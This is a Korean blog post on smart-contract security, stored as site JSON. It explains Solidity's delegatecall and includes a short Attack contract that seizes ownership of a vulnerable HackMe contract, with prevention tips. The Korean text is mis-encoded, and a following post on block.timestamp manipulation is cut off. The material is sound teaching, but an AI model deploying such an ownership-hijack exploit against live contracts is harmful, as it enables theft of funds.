{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/vulnerability/delegate_call/delegate_call/",
    "result": {"data":{"cur":{"id":"4ce78d24-2527-55dd-87de-8312b5de194b","html":"<h1 id=\"-delegatecall\" style=\"position:relative;\"><a href=\"#-delegatecall\" aria-label=\" delegatecall permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ DelegateCall</h1>\n<h2 id=\"ë“¤ì–´ê°€ê¸°ì „-call-ê³¼-delegate-callì˜-ì°¨ì´ì \" style=\"position:relative;\"><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84-call-%EA%B3%BC-delegate-call%EC%9D%98-%EC%B0%A8%EC%9D%B4%EC%A0%90\" aria-label=\"ë“¤ì–´ê°€ê¸°ì „ call ê³¼ delegate callì˜ ì°¨ì´ì  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë“¤ì–´ê°€ê¸°ì „ Call ê³¼ Delegate Callì˜ ì°¨ì´ì </h2>\n<h4 id=\"callì´ë€\" style=\"position:relative;\"><a href=\"#call%EC%9D%B4%EB%9E%80\" aria-label=\"callì´ë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Callì´ë€?</h4>\n<p>Callì€ ë‹¤ë¥¸ contractì™€ ìƒí˜¸ì‘ìš©í•˜ê¸° ìœ„í•œ low level functionì´ë‹¤.</p>\n<p>ì»¨íŠ¸ë™íŠ¸ Aë¥¼ í†µí•´ ì»¨íŠ¸ë™íŠ¸ Bì˜ í•¨ìˆ˜ í˜¸ì¶œì‹œ Bì˜ Storageë¥¼ ë³€ê²½ì‹œí‚¤ë©° msg.sender(í˜¸ì¶œì)ëŠ” ì»¨íŠ¸ë™íŠ¸Aì˜ ì£¼ì†Œê°€ ë©ë‹ˆë‹¤.</p>\n<h4 id=\"delegate-callì´ë€\" style=\"position:relative;\"><a href=\"#delegate-call%EC%9D%B4%EB%9E%80\" aria-label=\"delegate callì´ë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Delegate Callì´ë€?</h4>\n<p>delegate callì€ callê³¼ ë§¤ìš° ìœ ì‚¬í•˜ë‹¤. delegateì€ â€˜ìœ„ì„í•˜ë‹¤â€™ ë¼ëŠ” ëœ»ìœ¼ë¡œ callì— ëŒ€í•œ ê¶Œí•œì„ ìœ„ì„í•œë‹¤ê³  ë³¼ ìˆ˜ ìˆë‹¤.</p>\n<p>Delegate Callì—ëŠ” 2ê°€ì§€ íŠ¹ì§•ì´ ìˆë‹¤.</p>\n<ol>\n<li>í˜¸ì¶œí•œ contractì˜ contextë¥¼ ê¸°ë°˜ìœ¼ë¡œ ë™ì‘ëœë‹¤.</li>\n<li>storage layoutì€ delegatecallì„ ì´ìš©í•˜ëŠ” contractì™€ ê°™ì•„ì•¼í•œë‹¤.</li>\n</ol>\n<p>ì˜ˆë¥¼ ë“¤ì–´ ì»¨íŠ¸ë™íŠ¸ Aë¥¼ í†µí•´ ì»¨íŠ¸ë™íŠ¸ B í˜¸ì¶œì‹œ Bì˜ Storageë¥¼ ë³€ê²½ì‹œí‚¤ì§€ ì•Šê³ , Bì˜ ì½”ë“œë¥¼ Aì—ì„œ ì‹¤í–‰í•©ë‹ˆë‹¤. msg.senderì™€ msg.valueê°€ ì»¨íŠ¸ë™íŠ¸ A í˜¸ì¶œì‹œì™€ ê°™ê³ , ë³€ë™ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p>\n<p>ë§Œì•½ delegate callì— ëŒ€í•´ ë°©ì§€í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ contractì˜ ë‚´ìš©ì„ hackerê°€ ë§ˆìŒëŒ€ë¡œ ì¡°ì¢… í•  ìˆ˜ ìˆê²Œ ë ìˆ˜ë„ ìˆë‹¤. EX) ownerë³€ê²½, ether ê°€ë¡œì±„ê¸° ë“±ë“±</p>\n<hr>\n<h2 id=\"example-code-1\" style=\"position:relative;\"><a href=\"#example-code-1\" aria-label=\"example code 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Code 1</h2>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Lib</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">HackMe</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\r\n    Lib <span class=\"token keyword\">public</span> lib<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>Lib _lib<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n        lib <span class=\"token operator\">=</span> <span class=\"token function\">Lib</span><span class=\"token punctuation\">(</span>_lib<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>lib<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> hackMe<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _hackMe<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        hackMe <span class=\"token operator\">=</span> _hackMe<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        hackMe<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><span style=\"color:grey\">ì¶œì²˜: <a href=\"https://solidity-by-example.org/hacks/delegatecall/\">https://solidity-by-example.org/hacks/delegatecall/</a> </span></p>\n<p>ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ë ‡ë‹¤.</p>\n<ol>\n<li>Aê°€ Lib contract ë°°í¬</li>\n<li>Aê°€ Libì˜ addressë¥¼ í¬í•¨í•œ HackMe contract ë°°í¬</li>\n<li><strong>Hacker</strong> ê°€ HackMeì˜ addressë¥¼ í¬í•¨í•œ Attack contract ë°°í¬</li>\n<li><strong>Hacker</strong> ê°€ Attack.attack()ì„ call</li>\n<li>HackMe contractì˜ ownerëŠ” Attack contractê°€ ëœë‹¤.</li>\n</ol>\n<p>ì¢€ ë” ìì„¸íˆ ë“¤ì—¬ë‹¤ë³´ê² ë‹¤.\r\n<strong>Hacker</strong> ê°€ Attack.attackë¥¼ callí•˜ê²Œ ë˜ë©´ HackMe contractì˜ fallback functionì´ ì‹¤í–‰ëœë‹¤. Fallback functionì—ëŠ” libë¥¼ ì“°ê¸° ìœ„í•œ Delegate Callì´ ì¡´ì¬í•œë‹¤. Attack.attackì—ì„œ â€œpwn()â€œì„ ë³´ëƒˆê¸° ë•Œë¬¸ì— Lib contractì˜ pwnì´ ì‹¤í–‰ëœë‹¤.\r\nì´ë•Œ delegate callë¡œ callí•˜ì˜€ê¸° ë•Œë¬¸ì— msg.senderì€ Attack contractê°€ ëœë‹¤. ì´ë ‡ê²Œë˜ë©´ Attack contractê°€ HackMeì˜ ì£¼ì¸ì´ ëœë‹¤.</p>\n<hr>\n<h2 id=\"how-to-prevent\" style=\"position:relative;\"><a href=\"#how-to-prevent\" aria-label=\"how to prevent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to prevent?</h2>\n<ol>\n<li><strong>library</strong> í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•œë‹¤.\r\nlibrary í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•¨ìœ¼ë¡œì¨ statelessí•˜ê³  self destructë¥¼ ë°©ì§€ í•  ìˆ˜ ìˆë‹¤.</li>\n<li>ê°€ëŠ¥í•˜ë‹¤ë©´ stateless ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•œë‹¤.\r\nìœ„ì™€ ë§ˆì°¬ê°€ì§€ë¡œ statelessí•˜ë‹¤ë©´ ë°”ê¿€ stateê°€ ì—†ê¸° ë•Œë¬¸ì— ë” ì•ˆì „í•´ì§ˆ ìˆ˜ ìˆë‹¤.</li>\n</ol>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>ë‚˜ì—ê²Œ Delegate callì€ ìƒê°ë³´ë‹¤ ê°œë…ì´ ì–´ë ¤ì› ë‹¤. Example codeì™€ ë‹¤ë¥¸ exampleë“¤ì„ í†µí•´ ì‹¤ìŠµí•˜ë©´ì„œ ê°œë…ì„ ì–»ì„ ê²ƒ ê°™ë‹¤. í•œí¸ìœ¼ë¡œ ì´ê²Œ ì–´ë ¤ìš°ë©´ ë‹¤ë¥¸ê±´ ì–´ì§¸í•˜ëƒ~~ ë¼ëŠ” ìƒê°ì´ë“¤ì§€ë§Œ ê·¸ë•Œë§ˆë‹¤ ì‹¤ìŠµí•˜ì§€ ë­!! ì‹¤ìŠµ ì§±!!</p>\n<hr>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EB%93%A4%EC%96%B4%EA%B0%80%EA%B8%B0%EC%A0%84-call-%EA%B3%BC-delegate-call%EC%9D%98-%EC%B0%A8%EC%9D%B4%EC%A0%90\">ë“¤ì–´ê°€ê¸°ì „ Call ê³¼ Delegate Callì˜ ì°¨ì´ì </a></p>\n<ul>\n<li>\n<ul>\n<li><a href=\"#call%EC%9D%B4%EB%9E%80\">Callì´ë€?</a></li>\n<li><a href=\"#delegate-call%EC%9D%B4%EB%9E%80\">Delegate Callì´ë€?</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"#example-code-1\">Example Code 1</a></p>\n</li>\n<li>\n<p><a href=\"#how-to-prevent\">How to prevent?</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></p>\n</li>\n</ul>\n</div>","excerpt":"ğŸ‘‹ DelegateCall ë“¤ì–´ê°€ê¸°ì „ Call ê³¼ Delegate Callì˜ ì°¨ì´ì  Callì´ë€? Callì€ ë‹¤ë¥¸ contractì™€ ìƒí˜¸ì‘ìš©í•˜ê¸° ìœ„í•œ low level functionì´ë‹¤. ì»¨íŠ¸ë™íŠ¸ Aë¥¼ í†µí•´ ì»¨íŠ¸ë™íŠ¸ Bì˜ í•¨ìˆ˜ í˜¸ì¶œì‹œ Bì˜ Storageë¥¼ ë³€ê²½ì‹œí‚¤ë©° msg.sender(í˜¸ì¶œì)ëŠ” ì»¨íŠ¸ë™íŠ¸Aì˜ ì£¼ì†Œê°€ ë©ë‹ˆë‹¤. Delegate Callì´ë€? delegate callì€ callê³¼ ë§¤ìš° ìœ ì‚¬í•˜ë‹¤. delegateì€ â€˜ìœ„ì„í•˜ë‹¤â€™ ë¼ëŠ” ëœ»ìœ¼ë¡œ callì— ëŒ€í•œ ê¶Œí•œì„ ìœ„ì„í•œë‹¤ê³  ë³¼ ìˆ˜ ìˆë‹¤. Delegate Callì—ëŠ” 2ê°€ì§€ íŠ¹ì§•ì´ ìˆë‹¤. í˜¸ì¶œí•œ contractì˜ contextë¥¼ ê¸°ë°˜ìœ¼ë¡œ ë™ì‘ëœë‹¤. storage layoutì€ delegatecallì„ ì´ìš©í•˜ëŠ” contractì™€ ê°™ì•„ì•¼í•œë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ì»¨íŠ¸ë™íŠ¸ Aë¥¼ í†µí•´ ì»¨íŠ¸ë™íŠ¸ B í˜¸ì¶œì‹œ Bì˜ Storageë¥¼ ë³€ê²½ì‹œí‚¤ì§€ ì•Šê³ , Bì˜ ì½”ë“œë¥¼ Aì—ì„œ ì‹¤í–‰í•©ë‹ˆë‹¤. msg.senderì™€ msg.valueê°€ ì»¨íŠ¸ë™íŠ¸ A í˜¸ì¶œì‹œì™€ ê°™â€¦","frontmatter":{"date":"December 26, 2021","title":"(ì·¨ì•½ì  ì‹œë¦¬ì¦ˆ 4) Delegate Call","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/vulnerability/delegate_call/delegate_call/"}},"next":{"id":"61d64787-9a91-539d-8e79-abcc19096677","html":"<h1 id=\"-blocktimestamp\" style=\"position:relative;\"><a href=\"#-blocktimestamp\" aria-label=\" blocktimestamp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ block.timestamp</h1>\n<h2 id=\"blocktimestampë€\" style=\"position:relative;\"><a href=\"#blocktimestamp%EB%9E%80\" aria-label=\"blocktimestampë€ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>block.timestampë€?</h2>\n<p>block.timestampëŠ” msg.senderì²˜ëŸ¼ ë¸”ë¡ì²´ì¸ì—ì„œ ì œê³µí•´ì£¼ëŠ” global ë³€ìˆ˜ ì¤‘ í•˜ë‚˜ì´ë‹¤. ì´ëŠ” ë¸”ë¡ ìƒì„± ì‹œê°„ì„ ë‚˜íƒ€ë‚¸ë‹¤.\r\në¸”ë¡ì²´ì¸ì˜ timestampëŠ” ìƒì„± ì‹œì ì— ë°ì´í„°ê°€ ì¡´ì¬í–ˆë‹¤ëŠ” ì‚¬ì‹¤ì„ ì¦ëª…í•´ì£¼ê¸° ë•Œë¬¸ì— ë¸”ë¡ì²´ì¸ ìì²´ì— ë§¤ìš° ì¤‘ìš”í•˜ë‹¤.</p>\n<hr>\n<h2 id=\"ì™œ-ì·¨ì•½ì -ì‹œë¦¬ì¦ˆì—-ë“¤ì–´ê°”ì„ê¹Œ\" style=\"position:relative;\"><a href=\"#%EC%99%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%9C%EB%A6%AC%EC%A6%88%EC%97%90-%EB%93%A4%EC%96%B4%EA%B0%94%EC%9D%84%EA%B9%8C\" aria-label=\"ì™œ ì·¨ì•½ì  ì‹œë¦¬ì¦ˆì— ë“¤ì–´ê°”ì„ê¹Œ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì™œ ì·¨ì•½ì  ì‹œë¦¬ì¦ˆì— ë“¤ì–´ê°”ì„ê¹Œ?</h2>\n<p>ë°”ë¡œ block.timestampëŠ” ì±„êµ´ì(miner)ë“¤ì—ê²Œ ì˜í–¥ì„ ë°›ì„ ìˆ˜ ìˆê¸° ë•Œë¬¸ì´ë‹¤. ì¦‰ block.timestampë¥¼ í†µí•´ randomì„ ìƒì„±í•˜ê±°ë‚˜ block.timestampì™€ ê´€ë ¨í•´ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ê°€ ìˆë‹¤ë©´ smart contractì—ê²Œ ì¢‹ì§€ ì•Šì€ ì˜í–¥ì„ ë¼ì¹  ìˆ˜ ìˆë‹¤.</p>\n<hr>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example code</h2>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Roulette</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> pastBlockTime<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">spin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">10</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// must send 10 ether to play</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">!=</span> pastBlockTime<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// only 1 transaction per block</span>\r\n\r\n        pastBlockTime <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">%</span> <span class=\"token number\">15</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n            <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p><span style=\"color:grey\">ì¶œì²˜: <a href=\"https://solidity-by-example.org/hacks/block-timestamp-manipulation/\">https://solidity-by-example.org/hacks/block-timestamp-manipulation/</a></span></p>\n<p>ìœ„ ì½”ë“œë¥¼ ì‹¤í–‰ì‹œì¼œ ë³¼ ìˆ˜ëŠ” ìˆì§€ë§Œ ì‹¤ì œ í•´í‚¹ ì‹¤ìŠµê¹Œì§€ í•´ë³´ëŠ” ê²ƒì€ ì–´ë ¤ìš¸ ê²ƒì´ë¼ê³  ìƒê°í•œë‹¤. ìš°ë¦¬ê°€ minerê°€ ë  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì—ã… ã… </p>\n<p>ìœ„ ì½”ë“œëŠ” ë£°ë«ì„ í†µí•´ etherë¥¼ ì–»ì„ ìˆ˜ ìˆëŠ” ê²Œì„ì´ë‹¤.\r\n10 etherë¥¼ contract accountì— ë³´ë‚´ê³  ë§Œì•½ timestampê°€ 15ì˜ ë°°ìˆ˜ë¼ë©´ CAì— ìˆëŠ” ëª¨ë“  etherë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤.</p>\n<p>ì˜ˆë¥¼ ë“¤ì–´, CAì— 300 etherê°€ ìŒ“ì—¬ìˆë‹¤ê³  ìƒê°í•´ë³´ì! 2021/12/23 ì‹œì„¸ë¡œ 300 ehterëŠ” 14ì–µì´ ë„˜ëŠ” ëˆì´ë‹¤. ë§Œì•½ minerê°€ timestampë¥¼ ì¡°ì‘í•˜ëŠ”ë° ë“œëŠ” ë¹„ìš©ì´ 14ì–µë³´ë‹¤ ì ê²Œë“ ë‹¤ë©´ ì¡°ì‘ì„ ì‹œë„í•´ë³¼ë§Œ í•˜ë‹¤.</p>\n<hr>\n<h2 